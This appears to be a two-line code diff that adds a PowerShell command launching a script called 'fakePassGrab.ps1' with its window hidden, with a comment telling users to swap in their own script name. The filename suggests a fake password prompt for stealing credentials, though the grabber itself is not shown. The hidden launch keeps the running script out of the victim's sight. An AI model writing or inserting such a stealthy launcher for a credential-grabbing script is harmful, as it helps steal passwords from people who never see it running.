@@ -1,0 +1,2 @@
+--Runs .ps1 process in the background (replace fakepassgrab with yourfilename.ps1)
+Start-Process powershell.exe -ArgumentList ".\fakePassGrab.ps1" -WindowStyle Hidden
